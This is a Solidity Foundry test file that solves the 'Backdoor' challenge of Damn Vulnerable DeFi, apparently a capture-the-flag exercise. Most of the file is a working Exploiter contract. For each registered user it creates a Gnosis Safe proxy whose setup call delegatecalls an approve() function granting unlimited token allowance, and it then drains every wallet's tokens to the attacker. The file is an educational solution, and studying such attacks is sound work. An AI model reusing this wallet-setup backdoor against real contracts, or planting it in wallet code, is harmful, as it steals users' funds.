// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {WalletRegistry} from "../../../src/Contracts/backdoor/WalletRegistry.sol";
import {GnosisSafe} from "gnosis/GnosisSafe.sol";
import {GnosisSafeProxyFactory} from "gnosis/proxies/GnosisSafeProxyFactory.sol";

contract Backdoor is Test {
    uint256 internal constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;
    uint256 internal constant NUM_USERS = 4;

    Utilities internal utils;
    DamnValuableToken internal dvt;
    GnosisSafe internal masterCopy;
    GnosisSafeProxyFactory internal walletFactory;
    WalletRegistry internal walletRegistry;
    address[] internal users;
    address payable internal attacker;
    address internal alice;
    address internal bob;
    address internal charlie;
    address internal david;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */

        utils = new Utilities();
        users = utils.createUsers(NUM_USERS);

        alice = users[0];
        bob = users[1];
        charlie = users[2];
        david = users[3];

        vm.label(alice, "Alice");
        vm.label(bob, "Bob");
        vm.label(charlie, "Charlie");
        vm.label(david, "David");

        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
        vm.label(attacker, "Attacker");

        // Deploy Gnosis Safe master copy and factory contracts
        masterCopy = new GnosisSafe();
        vm.label(address(masterCopy), "Gnosis Safe");

        walletFactory = new GnosisSafeProxyFactory();
        vm.label(address(walletFactory), "Wallet Factory");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        // Deploy the registry
        walletRegistry = new WalletRegistry(
            address(masterCopy),
            address(walletFactory),
            address(dvt),
            users
        );

        // Users are registered as beneficiaries
        for (uint256 i = 0; i < NUM_USERS; i++) {
            assertTrue(walletRegistry.beneficiaries(users[i]));
        }

        // Transfer tokens to be distributed to the registry
        dvt.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        vm.startPrank(attacker);
        Exploiter exploiter = new Exploiter(dvt, masterCopy, walletFactory, walletRegistry);
        vm.label(address(exploiter), "Exploiter contract");
        exploiter.exploit(users);
        vm.stopPrank();
        console.log(
            "attackers dvt balance: %s, walletRegistry balance: %s",
            dvt.balanceOf(attacker) / 1e18,
            dvt.balanceOf(address(walletRegistry)) / 1e18
        );
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        /**
         * SUCCESS CONDITIONS
         */
        for (uint256 i = 0; i < NUM_USERS; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            if (wallet == address(0)) {
                emit log("User did not register a wallet");
                fail();
            }

            // User is no longer registered as a beneficiary
            assertTrue(!walletRegistry.beneficiaries(users[i]));
        }

        // Attacker must have taken all tokens
        assertEq(dvt.balanceOf(attacker), AMOUNT_TOKENS_DISTRIBUTED);
    }
}

contract Exploiter {
    DamnValuableToken internal immutable dvt;
    GnosisSafe internal immutable masterCopy;
    GnosisSafeProxyFactory internal immutable walletFactory;
    WalletRegistry internal immutable walletRegistry;
    address internal immutable owner;
    address internal immutable self;

    modifier onlyOwner() {
        require(msg.sender == owner, "only owner"); // Modifier to avoid getting front-run by searchers
        _;
    }

    constructor(
        DamnValuableToken _dvt,
        GnosisSafe _masterCopy,
        GnosisSafeProxyFactory _walletFactory,
        WalletRegistry _walletRegistry
    ) {
        dvt = _dvt;
        masterCopy = _masterCopy;
        walletFactory = _walletFactory;
        walletRegistry = _walletRegistry;
        owner = msg.sender;
        self = address(this);
    }

    function exploit(address[] calldata users) external onlyOwner {
        for (uint256 i = 0; i < users.length;) {
            address[] memory proxyUsers = new address[](1);
            proxyUsers[0] = users[i];

            bytes memory data = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                proxyUsers,
                1,
                address(this),
                abi.encodeWithSignature("approve()"),
                address(this),
                address(0),
                0,
                address(0)
            );

            walletFactory.createProxyWithCallback(address(masterCopy), data, 1, walletRegistry);
            address proxyAddress = walletRegistry.wallets(proxyUsers[0]);

            dvt.transferFrom(proxyAddress, owner, dvt.balanceOf(proxyAddress));

            unchecked {
                i++;
            }
            console.log("balance of dvt in wallet: ", dvt.balanceOf(walletRegistry.wallets(proxyUsers[0])) / 1e18);
            console.log("balance of dvt in exploter: ", dvt.balanceOf(address(this)) / 1e18);
        }
    }

    function approve() external {
        console.log("Approving spend of DVT balance");
        dvt.approve(self, type(uint256).max);
    }
}
